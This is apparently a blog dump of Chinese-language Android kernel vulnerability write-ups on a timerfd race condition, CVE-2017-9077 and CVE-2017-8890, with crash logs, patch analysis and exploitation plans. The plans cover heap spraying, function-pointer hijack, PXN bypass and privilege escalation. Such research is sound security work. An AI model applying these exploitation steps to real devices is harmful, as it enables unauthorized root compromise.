00000000000f4240 [ 72.679315] x9 : 00000000000003e8 x8 : 0000000000000056 [ 72.679325] x7 : 0000000000000000 x6 : 0000010624dd2fb8 [ 72.679334] x5 : 0000000000000000 x4 : 0000000000000003 [ 72.679344] x3 : ffffffc04ab4d7c0 x2 : 0000000000200200 [ 72.679353] x1 : 0000000000200200 x0 : ffffffc0010fa350 ... [ 72.679516] Call trace: [ 72.679524] [&lt;ffffffc0001fe99c&gt;] do_timerfd_settime+0x13c/0x384 [ 72.679532] [&lt;ffffffc0001ff284&gt;] SyS_timerfd_settime+0x80/0x100 [ 72.679539] Code: f9406662 f2a00401 aa1403e0 f9000462 (f9000043) [ 72.679588] ---[ end trace 4bf3b843607c1053 ]--- [ 72.704005] Kernel panic - not syncing: Fatal exception [ 72.704028] CPU4: stopping 我们通过分析不同手机的内核崩溃日志可以看到是存在两种不同崩溃的，这取决于当前内核的LIST_POISON2宏的值（0xdead000000200200 或 0x00200200）当LIST_POISON2等于0xdead000000200200因为无法使用mmap对其进行映射，导致触发漏洞时会稳定崩溃在对该地址进行写入的位置，没想到如何避免该崩溃，而当LIST_POISON2等与0x00200200时我们可以通过mmap函数在exploit程序中对其进行映射，当触发漏洞的时候也就不会造成内核崩溃，也就可以进行我们下一步的利用操作，以下的操作都是基于LIST_POISON2等于0x00200200 漏洞成因首先看下官方给的补丁左边属于打补丁之前的代码，右边属于打补丁之后的代码可以看到主要是新添加了一个__timerfd_remove_cancel函数，该函数是在对timerfd_remove_cancel函数做调用的时候进行锁操作，在timerfd_setup_cancel函数中也加了锁操作，所以我们着重分析没打补丁之前的timerfd_setup_canceled函数和timerfd_remove_cancel函数123456789101112131415static void timerfd_setup_cancel(struct timerfd_ctx *ctx, int flags)&#123; if ((ctx-&gt;clockid == CLOCK_REALTIME || ctx-&gt;clockid == CLOCK_REALTIME_ALARM) &amp;&amp; (flags &amp; TFD_TIMER_ABSTIME) &amp;&amp; (flags &amp; TFD_TIMER_CANCEL_ON_SET)) &#123; if (!ctx-&gt;might_cancel) &#123; ctx-&gt;might_cancel = true; spin_lock(&amp;cancel_lock); list_add_rcu(&amp;ctx-&gt;clist, &amp;cancel_list); /* 对ctx-&gt;clist做添加操作 */ spin_unlock(&amp;cancel_lock); &#125; &#125; else if (ctx-&gt;might_cancel) &#123; timerfd_remove_cancel(ctx); /* 对ctx-&gt;clist做删除操作 */ &#125;&#125; 1234static inline void list_add_rcu(struct list_head *new, struct list_head *head)&#123; __list_add_rcu(new, head, head-&gt;next);&#125; 123456789static void timerfd_remove_cancel(struct timerfd_ctx *ctx)&#123; if (ctx-&gt;might_cancel) &#123; ctx-&gt;might_cancel = false; spin_lock(&amp;cancel_lock); list_del_rcu(&amp;ctx-&gt;clist); /* 对ctx-&gt;clist做删除操作*/ spin_unlock(&amp;cancel_lock); &#125;&#125; 12345static inline void list_del_rcu(struct list_head *entry)&#123; __list_del_entry(entry); entry-&gt;prev = LIST_POISON2;&#125; 首先来熟悉下timerfd_setup_cancel函数的逻辑,该函数存在两条分支,而这两条分支又都是通过判断ctx-&gt;might_cancel变量的值来控制应该执行哪条分支 1.ctx-&gt;might_cancel == false, call -&gt; list_add_rcu函数 2.ctx-&gt;might_cancel == true, call -&gt; timerfd_remove_cancel函数 第一次调用timerfd_setup_cancel函数时,当ctx-&gt;might_cancel等于false的时候,内核会走分支1,然后把ctx-&gt;might_cancel设置为true,然后调用list_add_rcu函数对cancel_list进行添加操作。再次调用timerfd_setup_cancel函数的时候,因为第一次已经把ctx-&gt;might_cancel设置为true了,所以会进入分支2执行,然后调用timerfd_remove_cancel函数,把ctx-&gt;might_cancel设置为false,并且调用list_del_rcu函数对cancel_list进行删除操作。 弄清楚该函数逻辑后再回头看看补丁,也就明白为什么官方要增加两个锁操作了,猜测是因为这里的ctx-&gt;might_cancel在没打补丁之前是允许被别的进程修改的,一加一减本来是没什么问题,如果是单线程对timerfd_setup_cancel函数做调用的话,但是如果是两个线程或多个线程同时调用timerfd_setup_cancel函数那么会怎么样呢?可能就会出现线程同步问题,存在下面3种情况。为什么说两个不同的线程修改的会是同一个ctx结构体呢?那么我们可以先来看看ctx这个变量是怎么来的,在系统调用timerfd_create处可以看到ctx是在我们创建计时器对象时申请的,ctx在timerfd_create函数中被创建后,后续函数中的ctx都是以结构体指针(struct timerfd_ctx *)的方式对最开始创建的ctx进行访问,也就是说每个函数中操作的ctx-&gt;might_cancel其实也都是同一个变量,这也证明我们之前的猜测是没毛病的,这样的话我们完全可以创建多个线程与主线程做竞争改变ctx-&gt;might_cancel变量的值。1234567891011121314151617181920212223242526272829303132333435363738SYSCALL_DEFINE2(timerfd_create, int, clockid, int, flags)&#123; int ufd; struct timerfd_ctx *ctx; enum alarmtimer_type type; /* Check the TFD_* constants for consistency. */ BUILD_BUG_ON(TFD_CLOEXEC != O_CLOEXEC); BUILD_BUG_ON(TFD_NONBLOCK != O_NONBLOCK); if ((flags &amp; ~TFD_CREATE_FLAGS) || (clockid != CLOCK_MONOTONIC &amp;&amp; clockid != CLOCK_REALTIME &amp;&amp; clockid != CLOCK_REALTIME_ALARM &amp;&amp; clockid != CLOCK_BOOTTIME &amp;&amp; clockid != CLOCK_BOOTTIME_ALARM &amp;&amp; clockid != CLOCK_POWEROFF_ALARM)) return -EINVAL; ctx = kzalloc(sizeof(*ctx), GFP_KERNEL); /* ctx在此处被创建,并会被用于后续的操作 */ if (!ctx) return -ENOMEM; init_waitqueue_head(&amp;ctx-&gt;wqh); ctx-&gt;clockid = clockid; if (isalarm(ctx)) &#123; type = clock2alarm(ctx-&gt;clockid); alarm_init(&amp;ctx-&gt;t.alarm, type, timerfd_alarmproc); &#125; else &#123; hrtimer_init(&amp;ctx-&gt;t.tmr, clockid, HRTIMER_MODE_ABS); &#125; ctx-&gt;moffs = ktime_mono_to_real((ktime_t)&#123; .tv64 = 0 &#125;); ufd = anon_inode_getfd(\"[timerfd]\", &amp;timerfd_fops, ctx, O_RDWR | (flags &amp; TFD_SHARED_FCNTL_FLAGS)); if (ufd &lt; 0) kfree(ctx); return ufd;&#125; 该漏洞属于多线程并行造成的条件竞争问题,从崩溃信息来看,我们触发的应该是第3种情况(对cancel_list做两次删除操作)。 第一次删除entry-&gt;prev被设置为了LIST_POISON2(0x00200200),因为属于正常删除,所以此时系统并没有崩溃, 第二次删除在__list_del_entry中取entry_prev指向地址(0x00200200)的值，因为0x00200200该地址未映射,导致访问异常，系统崩溃 因为两次删除的是同一个结构体,而第一次把结构体的entry_prev设置为了0x00200200,当第二次进行取值的时候就出现了访问异常。 漏洞利用ctx-&gt;clist增删调用链:用户层的系统调用timerfd_settime() timerfd_settime() ---&gt; 增加链 \\__do_timerfd_settime() \\__timerfd_setup_cancel() \\__list_add_rcu() timerfd_settime() ---&gt; 删除链 \\__do_timerfd_settime() \\__timerfd_setup_cancel() \\__timerfd_remove_cancel() \\__list_del_rcu() 利用思路我们可以把条件竞争漏洞进阶为Use_After_Free漏洞,也就是前面提到的3种情况中的第2种情况,该情况会对cancel_list添加两次,那时的ctx-&gt;prev == ctx-&gt;next,然后释放掉ctx-&gt;prev指向的内存—也就是节点本身,但是ctx-&gt;next却对该内存还存在引用,这就给了我们后面的利用思路。总体可分为6步: 第一步:调用timerfd_create()函数创建一个timerfd和分配ctx结构体内存 第二步:创建多个线程同时调用timerfd_settime函数,争取触发第2种竞争问题 第三步:调用close函数触发释放结构体内存kfree_rcu(ctx) --&gt; timerfd_release --&gt; timerfd_remove_cancel(ctx) 第四步:通过Heap spray技术对ctx结构体进行喷射,填充释放的ctx结构体 第五步:通过调用settimeofday函数,触发释放后重引用漏洞,从而控制”PC” 第六步:使用gadget对address_limit进行修改,并绕过PXN保护机制 12345678let_go_timerfd_setup_cancel list_add_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=200200,next=c5c9b388let_go_timerfd_setup_cancel list_add_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=c049c244,next=c5c9b388let_go_timerfd_release &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=c5c9b2c8,next=c5c9b2c8let_go_timerfd_remove_cancel list_del_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=c5c9b2c8,next=c5c9b2c8 /*第一次删除,此时前后指针已经指向同一地址 0xc5c9b2c8*//*-----------------------------------喷射时机----------------------------------------------- ----*/结束时let_go_timerfd_release &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b300 prev=c5c9b2c8,next=c92891c8 let_go_timerfd_remove_cancel list_del_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b300 prev=c5c9b2c8,next=c92891c8 /*第二次删除*/ 首先通过竞争条件对cancel_list链表添加了两次同一地址的结构体,第一次释放结构体时会把ctx-&gt;prev指向的内存释放掉,却并没有操作ctx-&gt;next变量的值,因为ctx-&gt;next == ctx-&gt;prev,ctx-&gt;next还指向自身,所以该ctx内存虽然被释放,但还存在cancel_list链表中,紧接着我们通过喷射，填充之前释放的结构体内存。 然后在用户层触发重引用(settimerofday()),settimerofday底层实现函数timerfd_clock_was_set会对cancel_list链表进行遍历,并且取遍历出的ctx结构体成员wqh的地址作为wake_up_locked()函数的参数传入。123456789101112131415161718192021222324252627void clock_was_set(void)&#123;#ifdef CONFIG_HIGH_RES_TIMERS /* Retrigger the CPU local events everywhere */ on_each_cpu(retrigger_next_event, NULL, 1);#endif timerfd_clock_was_set();&#125;void timerfd_clock_was_set(void)&#123; ktime_t moffs = ktime_mono_to_real((ktime_t)&#123; .tv64 = 0 &#125;); struct timerfd_ctx *ctx; unsigned long flags; rcu_read_lock(); list_for_each_entry_rcu(ctx, &amp;cancel_list, clist) &#123; /* 遍历喷射ctx结构体 */ if (!ctx-&gt;might_cancel) continue; spin_lock_irqsave(&amp;ctx-&gt;wqh.lock, flags); if (ctx-&gt;moffs.tv64 != moffs.tv64) &#123; ctx-&gt;moffs.tv64 = KTIME_MAX; ctx-&gt;ticks++; wake_up_locked(&amp;ctx-&gt;wqh); /* 传入喷射结构体 */ &#125; spin_unlock_irqrestore(&amp;ctx-&gt;wqh.lock, flags); &#125; rcu_read_unlock();&#125; 再来看看wake_up_locked函数内部实现。123456789101112131415161718192021222324252627282930#define wake_up_locked(x) __wake_up_locked((x), TASK_NORMAL, 1)void __wake_up_locked(wait_queue_head_t *q, unsigned int mode, int nr)&#123; __wake_up_common(q, mode, nr, 0, NULL);&#125;static void __wake_up_common(wait_queue_head_t *q, unsigned int mode, int nr_exclusive, int wake_flags, void *key)&#123; wait_queue_t *curr, *next; list_for_each_entry_safe(curr, next, &amp;q-&gt;task_list, task_list) &#123; unsigned flags = curr-&gt;flags; if (curr-&gt;func(curr, mode, wake_flags, key) &amp;&amp; /* 控制内核执行流*/ (flags &amp; WQ_FLAG_EXCLUSIVE) &amp;&amp; !--nr_exclusive) break; &#125;&#125;struct __wait_queue_head &#123; spinlock_t lock; struct list_head task_list;&#125;;typedef struct __wait_queue wait_queue_t;typedef int (*wait_queue_func_t)(wait_queue_t *wait, unsigned mode, int flags, void *key); /* 函数指针原型 */struct __wait_queue &#123; unsigned int flags; void *private; wait_queue_func_t func; /* 函数指针 */ struct list_head task_list;&#125;; 可以看到在该函数内部存在一个函数指针(curr-&gt;func)的间接调用,而这个func属于curr的成员,curr又是通过使用list_for_each_entry_safe宏把q-&gt;task_list的next赋值过来的,q又是wake_up_locked函数的参数1,也就是遍历到的ctx成员wqh。 因为cancel_list链表中还存在之前被释放的ctx结构体,所以这里遍历到的ctx结构体也就是我们喷射的ctx结构体,这样看来所有的一切我们似乎都可以控制,只要通过内核源码,精心构造喷射的ctx结构体,绕过内核的一些检测控制内核的执行流还是很容易的。不过构造数据时需要注意一下list_for_each_entry_safe这个宏,不然可能会进入死循环,导致内核崩溃。list_for_each_entry_safe宏 list_for_each_entry_safe(curr, next, &amp;q-&gt;task_list, task_list) #define list_for_each_entry_safe(pos, n, head, member) \\ for (pos = list_entry((head)-&gt;next, typeof(*pos), member), \\ /* curr赋值*/ n = list_entry(pos-&gt;member.next, typeof(*pos), member); \\ /* 初始化pos */ &amp;pos-&gt;member != (head); \\ /* 结束条件 */ pos = n, n = list_entry(n-&gt;member.next, typeof(*n), member)) /* 改变条件 */ 喷射结构体信息12345678910111213141516struct timerfd_ctx &#123; union &#123; struct hrtimer tmr; struct alarm alarm; &#125; t; ktime_t tintv; ktime_t moffs; wait_queue_head_t wqh; /*&gt;&gt;&gt;&gt;&gt;*/ u64 ticks; int clockid; short unsigned expired; short unsigned settime_flags; /* to show in fdinfo */ struct rcu_head rcu; struct list_head clist; bool might_cancel;&#125;; 32位 (gdb) p &amp;((struct timerfd_ctx*)0)-&gt;might_cancel $1 = (bool *) 0x90 64位 (gdb) p &amp;((struct timerfd_ctx*)0)-&gt;might_cancel $1 = (bool *) 0xf0 不同的内核,编译出来的大小也会不一样 触发链在内核中找到了几条触发链:比较无语的就是这些系统调用函数都会判断当前进程是否有CAP_SYS_TIME权限,如果有该权限才会执行后面的函数,不然就会中途退出 sys_stime() -&gt; do_settimeofday() -&gt; clock_was_set() -&gt; timerfd_clock_was_set() adjtimex() -&gt; do_adjtimex() -&gt; clock_was_set() -&gt; timerfd_clock_was_set() settimeofday() -&gt; do_sys_settimeofday -&gt; do_settimeofday() -&gt; clock_was_set() -&gt; timerfd_clock_was_set() 看了下android中的系统进程(SystemServer)是存在该权限的,所以我也可以结合别的AOSP漏洞,先拿到SystemServer进程的执行权限,然后再利用该内核漏洞进行提权,不过感觉好鸡肋啊￣□￣｜｜","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2017-9077","slug":"CVE-2017-9077","date":"2017-09-20T02:12:15.000Z","updated":"2019-03-30T10:08:59.927Z","comments":true,"path":"2017/09/20/CVE-2017-9077/","link":"","permalink":"http://github.com/2017/09/20/CVE-2017-9077/","excerpt":"","text":"CVE-2017-9077 前言实验环境： 相关信息： 漏洞成因：Linux内核4.11.11之前，net/ipv6/tcp_ipv6.c中的tcp_v6_syn_recv_sock函数错误处理继承，这与CVE-2017-8890类似 修补链接：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=83eaddab4378db256d00d295bda6ca997cd13a52 漏洞验证执行POC：查看崩溃函数及调用堆栈 [ 226.374015] Unable to handle kernel paging request at virtual address 00200218 [ 226.374053] pgd = ffffffc03eea7000 [ 226.374069] [00200218] *pgd=0000000000000000 [ 226.374096] Internal error: Oops: 96000005 [#1] PREEMPT SMP [ 226.374113] Modules linked in: [ 226.374141] CPU: 3 PID: 3738 Comm: CVE-2017-9077 Not tainted 3.10.58-03546-gd85102c #1 [ 226.374160] task: ffffffc02d199600 ti: ffffffc0384dc000 task.ti: ffffffc0384dc000 [ 226.374194] PC is at ipv6_sock_mc_close+0xa0/0x104 [ 226.374215] LR is at ipv6_sock_mc_close+0x98/0x104 [ 226.374231] pc : [&lt;ffffffc0008bda58&gt;] lr : [&lt;ffffffc0008bda50&gt;] pstate: 80000145 [ 226.374245] sp : ffffffc0384dfd60 [ 226.374259] x29: ffffffc0384dfd60 x28: ffffffc0384dc000 [ 226.374285] x27: ffffffc000e2e000 x26: ffffffc00113b000 [ 226.374310] x25: ffffffc000e3ff40 x24: ffffffc0355aecc0 [ 226.374335] x23: ffffffc00113b1a0 x22: ffffffc0355af318 [ 226.374359] x21: ffffffc0555d06c0 x20: ffffffc0355aedb0 [ 226.374383] x19: 0000000000200200 x18: 00000000ffffffff [ 226.374408] x17: 0000007ee813cb9c x16: ffffffc0001b3390 [ 226.374432] x15: 003b9aca00000000 x14: 001c983560000000 [ 226.374456] x13: ffffffffa58d9e94 x12: 0000000000000020 [ 226.374480] x11: 0000000000000000 x10: 00000000ffffffff [ 226.374504] x9 : 000000000000000a x8 : 0000000000000039 [ 226.374528] x7 : 6620646e6f636573 x6 : 0000007ee780f014 [ 226.374552] x5 : 0000000000000000 x4 : 0000000000000000 [ 226.374576] x3 : 0000000000000003 x2 : 0000000000000000 [ 226.374599] x1 : 0000000000000000 x0 : 0000000000040004 [ 226.374621] [ 226.374637] Process CVE-2017-9077 (pid: 3738, stack limit = 0xffffffc0384dc058) [ 226.375167] Call trace: [ 226.375190] [&lt;ffffffc0008bda58&gt;] ipv6_sock_mc_close+0xa0/0x104 [ 226.375212] [&lt;ffffffc0008977d4&gt;] inet6_release+0x24/0x4c [ 226.375234] [&lt;ffffffc00079ea80&gt;] sock_release+0x2c/0xa8 [ 226.375252] [&lt;ffffffc00079eb18&gt;] sock_close+0x1c/0x30 [ 226.375275] [&lt;ffffffc0001b593c&gt;] __fput+0x9c/0x224 [ 226.375294] [&lt;ffffffc0001b5b94&gt;] ____fput+0x1c/0x2c [ 226.375316] [&lt;ffffffc0000c4acc&gt;] task_work_run+0x9c/0xf4 [ 226.375339] [&lt;ffffffc000088bd4&gt;] do_notify_resume+0x5c/0x74 [ 226.375360] Code: aa1703e0 9402eea1 f9403ed3 b4000253 (f9400e61) [ 226.375378] ---[ end trace 701d394ca5320577 ]--- [ 226.449802] Kernel panic - not syncing: Fatal exception 可以看到内核是在对ipv6的sock进行关闭的时候触发的崩溃，这和我们意料中的一致 漏洞分析静态分析(熟悉触发流程,编写验证程序)有了POC的崩溃信息后，通过崩溃时的PC在IDA中查看崩溃的具体信息 .text:FFFFFFC00046D42C LDR X1, [mc_lst,#0x18] //mc_lst == X19结合vmlinux上下文和内核源码可知这条指令是获取mc_lst-&gt;next中的数据，但是因为此时的mc_lst == 0x200200，属于无效地址，所以导致取其偏移0x18中的内容时崩溃 我们知道是如何导致内核崩溃以后就需要分析他是怎么形成这种情景的，也就是漏洞模型(DoubuleFree)？，感觉这漏洞像是属于释放后重引用漏洞(UAF)，那么我们还是先找到它内存申请的位置和第一次释放的位置，第二次引用的位置申请位置：第一次释放位置第二次引用位置漏洞触发链：内存申请：ipv6_setsockopt( ) –&gt; do_ipv6_setsockopt( ) –&gt; case MCAST_JOIN_GROUP: ipv6_sock_mc_join( ) –&gt; sock_kmalloc( ) 内存释放：sock_close( ) –&gt; sock_release( ) –&gt; inet6_release( ) –&gt; ipv6_sock_mc_close( ) 内存重引用：sock_close( ) –&gt; sock_release( ) –&gt; inet6_release( ) –&gt; ipv6_sock_mc_close( ) 像这种漏洞我一般使用堆喷射来控制释放后的结构体，如果在后续的操作中会调用结构体中的函数指针，那么我们的目的也就达成了这一需要喷射的是mc_lst，它属于ipv6_mc_socklist结构体，123456789struct ipv6_mc_socklist &#123; struct in6_addr addr; int ifindex; struct ipv6_mc_socklist __rcu *next; rwlock_t sflock; unsigned int sfmode; /* MCAST_&#123;INCLUDE,EXCLUDE&#125; */ struct ip6_sf_socklist *sflist; struct rcu_head rcu;&#125;; 通过vmlinux计算该结构体的大小：sizeof(struct ipv6_mc_socklist) == 0x40通过IDA中的反汇编也可以计算其大小(查看引用最后一个成员时使用的偏移，注意：该偏移属于成员偏移，而不是结构体大小，最后可能需要加上最后一个成员的大小)， ：0x30+0x10(struct rcu_head size) == 0x40 .text:FFFFFFC00046D410 MOV X1, #0x30 ; func .text:FFFFFFC00046D414 ADD X0, mc_lst, X1 ; head .text:FFFFFFC00046D418 BL kfree_call_rcu 看了下该结构体中貌似就只有一个struct rcu_head rcu成员中存在函数指针，别的地方还真没有，还存在一个对struct ip6_sf_socklist *sflist成员进行kfree操作 动态调试(深入分析)该漏洞属于ipv6相关漏洞：关键的下断函数 ipv6_setsockopt ipv6_sock_mc_join 因为存在漏洞的64位的goldfish源码编译完毕后我模拟器启动不起来，所以测试环境是先找个模拟器能够启动的64位源码，然后手动修改去除CVE-2017-9077的补丁代码，修改时可以参考补丁链接上的补丁 漏洞利用 喷射思路： 首先获取需要喷射结构体的大小 触发漏洞 创建一个server线程 创建一个client线程 喷射线程 循环设置payload线程 堆喷射成功控制解引用地址 [ 148.998655] Unable to handle kernel paging request at virtual address 4343434343434347 [ 148.998691] pgd = ffffffc063872000 [ 148.998708] [4343434343434347] *pgd=0000000000000000 [ 148.998735] Internal error: Oops: 96000004 [#1] PREEMPT SMP [ 148.998752] Modules linked in: [ 148.998781] CPU: 3 PID: 4301 Comm: CVE-201 Not tainted 3.10.58-03546-gd85102c #1 [ 148.998800] task: ffffffc019bf3700 ti: ffffffc01942c000 task.ti: ffffffc01942c000 [ 148.998834] PC is at ip6_mc_leave_src+0x30/0xa4 [ 148.998856] LR is at ipv6_sock_mc_close+0xe0/0x104 [ 148.998873] pc : [&lt;ffffffc0008bbb98&gt;] lr : [&lt;ffffffc0008bda98&gt;] pstate: 80000145 [ 148.998887] sp : ffffffc01942fd30 [ 148.998901] x29: ffffffc01942fd30 x28: ffffffc01942c000 [ 148.998926] x27: ffffffc000e2e000 x26: ffffffc00113b000 [ 148.998951] x25: ffffffc000e3ff40 x24: ffffffc031daf400 [ 148.998975] x23: ffffffc00113b1a0 x22: ffffffc031dafa58 [ 148.999000] x21: ffffffc031daf400 x20: 0000000000000000 [ 148.999024] x19: ffffffc033818640 x18: 00000000ffffffff [ 148.999048] x17: 00000079b3decb9c x16: ffffffc0001b3390 [ 148.999073] x15: 003b9aca00000000 x14: 00281cfcca000000 [ 148.999097] x13: ffffffffa58d1501 x12: 0000000000000020 [ 148.999121] x11: 0000000000000000 x10: 00000000ffffffff [ 148.999145] x9 : 000000000000000a x8 : 0000000000000039 [ 148.999169] x7 : 6620646e6f636573 x6 : 00000079b2a0c014 [ 148.999193] x5 : 0000000000000000 x4 : 4343434343434343 [ 148.999217] x3 : 0000000000000001 x2 : 0000000043434343 [ 148.999241] x1 : ffffffc033818640 x0 : ffffffc0008bda98 [ 148.999263] [ 148.999279] Process CVE-201 (pid: 4301, stack limit = 0xffffffc01942c058) [ 148.999297] Stack: (0xffffffc01942fd30 to 0xffffffc019430000) [ 148.999318] fd20: 1942fd60 ffffffc0 008bda98 ffffffc0 [ ... ] [ 148.999838] ffe0: 00000004 00000000 00000039 00000000 0038002e 00370031 0020002c 00300032 [ 148.999851] Call trace: [ 148.999874] [&lt;ffffffc0008bbb98&gt;] ip6_mc_leave_src+0x30/0xa4 [ 148.999897] [&lt;ffffffc0008bda94&gt;] ipv6_sock_mc_close+0xdc/0x104 [ 148.999918] [&lt;ffffffc0008977d4&gt;] inet6_release+0x24/0x4c [ 148.999940] [&lt;ffffffc00079ea80&gt;] sock_release+0x2c/0xa8 [ 148.999957] [&lt;ffffffc00079eb18&gt;] sock_close+0x1c/0x30 [ 148.999980] [&lt;ffffffc0001b593c&gt;] __fput+0x9c/0x224 [ 148.999998] [&lt;ffffffc0001b5b94&gt;] ____fput+0x1c/0x2c [ 149.000020] [&lt;ffffffc0000c4acc&gt;] task_work_run+0x9c/0xf4 [ 149.000043] [&lt;ffffffc000088bd4&gt;] do_notify_resume+0x5c/0x74 [ 149.000064] Code: d503201f f9401664 b9402662 b40002a4 (b9400483) [ 149.000185] ---[ end trace 343ee1bba8b5cfe0 ]--- [ 149.074517] Kernel panic - not syncing: Fatal exception struct rcu_head rcu;利用时发现这个成员不能使用，因为内核会修改该成员的值，8890之前是通过一个结构体指针，指向用户空间虽然内核会修改里面的值，但是因为是在用户空间 我们只要开启一个线程进行保护修改就行，而这个不是一个结构体指针，喷射后我们就不能进行修改了 第二个思路：通过struct ipv6_mc_socklist __rcu *next;成员指向用户空间，然后构造数据 控制住了PC，后面的操作就简单多了 [ 116.545938] CPU: 0 PID: 3688 Comm: CVE-2017-9077 Not tainted 3.10.58-03546-gd85102c #1 [ 116.545948] task: ffffffc01d946e00 ti: ffffffc01d970000 task.ti: ffffffc01d970000 [ 116.545958] PC is at 0xaaaaaaaaaaaaaaaa [ 116.545976] LR is at rcu_process_callbacks+0x368/0x5f0 [ 116.545984] pc : [&lt;aaaaaaaaaaaaaaaa&gt;] lr : [&lt;ffffffc00012e1d0&gt;] pstate: a0000145 [ 116.545990] sp : ffffffc01d973930 [ 116.545996] x29: ffffffc01d973930 x28: ffffffc0b3f40060 [ 116.546007] x27: 0000000000000001 x26: ffffffc025b9dd00 [ 116.546019] x25: ffffffc01cc40a48 x24: ffffffc000981000 [ 116.546031] x23: ffffffc01d970000 x22: 000000000000000a [ 116.546042] x21: 0000000000000001 x20: ffffffc0b3f40088 [ 116.546053] x19: ffffffc000e33300 x18: 00000000ffffffff [ 116.546065] x17: 00000074716cc25c x16: ffffffc0001da624 [ 116.546076] x15: 000000747170672c x14: 0000007471706a88 [ 116.546088] x13: ffffffc000985990 x12: 0000000000000001 [ 116.546100] x11: 00000000000003d8 x10: 00000000000001a0 [ 116.546111] x9 : ffffffc000985990 x8 : 0000000000000001 [ 116.546123] x7 : ffffffc0b3f43a58 x6 : 0000000000000007 [ 116.546134] x5 : aaaaaaaaaaaaaaaa x4 : 0000000000000001 [ 116.546145] x3 : 0000000000000000 x2 : 0000000000000081 [ 116.546157] x1 : 0000000002000030 x0 : 0000000002000030 [ 116.546168] [ 116.546175] Process CVE-2017-9077 (pid: 3688, stack limit = 0xffffffc01d970058) [ 116.546728] Call trace: [ 116.546737] [&lt;aaaaaaaaaaaaaaaa&gt;] 0xaaaaaaaaaaaaaaaa [ 116.546749] [&lt;ffffffc0000a9a7c&gt;] __do_softirq+0x108/0x288 [ 116.546757] [&lt;ffffffc0000a9cc4&gt;] do_softirq+0x64/0x70 [ 116.546766] [&lt;ffffffc0000a9f48&gt;] irq_exit+0x94/0xc8 [ 116.546776] [&lt;ffffffc0000848b8&gt;] handle_IRQ+0x58/0xd8 [ 116.546785] [&lt;ffffffc0000813fc&gt;] gic_handle_irq+0x44/0x88 提权因为x0可控，使用总体来说提权还是蛮好提的，直接kernel_sock_ioctl即可kernel_sock_ioctl == ffffffc00079beb4 1.调用rcu回调时在别的进程中，导致访问地址失败，因为别的进程没有映射我们设置的地址 2.稳定崩溃在kfree函数中貌似因为内核竞争修改没有修改成功导致 本来以为可以复用8890那漏洞的思路，但是看了下漏洞结构体mc_lst，其中包含两个与rcu机制相关的结构体成员，1.struct rcu_head rcu2.struct ipv6_mc_socklist_rcu *next 最开始打算用mc_lst结构体中的rcu结构体成员，但是后来发现在kfree_rcu函数中会对我们控制的mc_lst-&gt;rcu.func函数指针做初始化，但是因为mc_lst成员不是指针，所以其成员在数据喷射的时候就已经固定在内核中了，这样就导致了我们直接喷射的数据不能利用，而需要通过间接利用，所以第一个结构体不能使用 还存在一个ipv6_mc_socklist_rcu next的函数指针，这个函数指针满足间接利用的条件(属于指针且可控)，尝试在用户态构造一个ipv6_mc_socklist_rcu结构体，让ipv6_mc_socklist_rcu next指针指向它，这样当内核kfree_rcu第一个ipv6_mc_socklist_rcu结构体后就会kfree_rcu第二个(用户态)的ipv6_mc_socklist_rcu结构体，这样会再次添加一个rcu回调函数并且可控 为什么8890可以利用呢？因为之前8890结构体中还存在一个结构体指针，该结构体中存在一个rcu_head结构体，因为该结构体指针是一个我们可控指针，所以可以把该指针指向用户空间可控的数据，然后再开启一个竞争修改数据的线程，与内核竞争修改rcu.func函数指针的值为我们想要控制的指针，就可以控制ruc回调函数的调用 可能在poc执行完毕后，测试机都没有崩溃第一次调用ipv6_sock_mc_close时竟然没进入循环 总结发生的情况","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2017-8890","slug":"CVE-2017-8890","date":"2017-09-20T02:12:15.000Z","updated":"2019-03-30T10:08:38.271Z","comments":true,"path":"2017/09/20/CVE-2017-8890/","link":"","permalink":"http://github.com/2017/09/20/CVE-2017-8890/","excerpt":"","text":"CVE-2017-8890 前言影响版本理论上Linux Kernel 2.5.69~Linux Kernel 4.11 测试内核Linux version 3.4.67-gd3ffcc7-dirty (ubuntu@ubuntu) (gcc version 4.6.x-google 20120106 (prerelease) (GCC) ) #4 PREEMPT Mon Sep 11 09:06:06 CST 2017(32位)PS：因为没找到合适的64位goldfish源码，所以直接使用的32位进行调试，64位原理是一致的 漏洞描述该漏洞属于一个Doubel Free漏洞,Linux内核中net/ipv4/inet_connection_sock.c中的inet_csk_clone_lock函数中存在浅拷贝问题,当我们调用accept函数时,会调用底层函数inet_csk_clone函数。若有客户端连接到该服务端,会用到accept函数中参数1和返回值,底层函数inet_csk_clone会将accept函数的参数1(parent_sockfd)所对应的sk变量拷贝到accept函数返回值(child_sockfd)所对应的sk变量中,但并没有清空child_sockfd所对应的sk-&gt;mc_list的值,当使用close函数对这两个句柄进行关闭时,会对sk结构中的iml进行两次释放,通过堆喷射可执行任意代码。 Google修复链接https://android.googlesource.com/kernel/goldfish/+/88c573e1342ea5734088052879987c0e8f9bf10c%5E%21/#F0 漏洞复现PC is at 0xeeeeeeea LR is at __rcu_process_callbacks+0x8c/0xa4 pc : [&lt;eeeeeeea&gt;] lr : [&lt;c0069f78&gt;] psr: a0000133 sp : c611de88 ip : c6d2dd98 fp : 0000000a r10: 00000009 r9 : d400e810 r8 : c9635ec8 r7 : 00000101 r6 : b6efb008 r5 : 00000fff r4 : c6d2dd98 r3 : eeeeeeee r2 : 00000000 r1 : 00000101 r0 : b6efb008 漏洞分析要点 对象何时何处被分配 内存分配链：sys_setsockopt( ) -&gt; sock_common_setsockopt( ) -&gt; tcp_setsockopt( ) -&gt; ip_setsockopt( ) -&gt; do_ip_setsockopt( ) -&gt; ip_mc_join_group( ) -&gt; sock_kmalloc( ) -&gt; […] 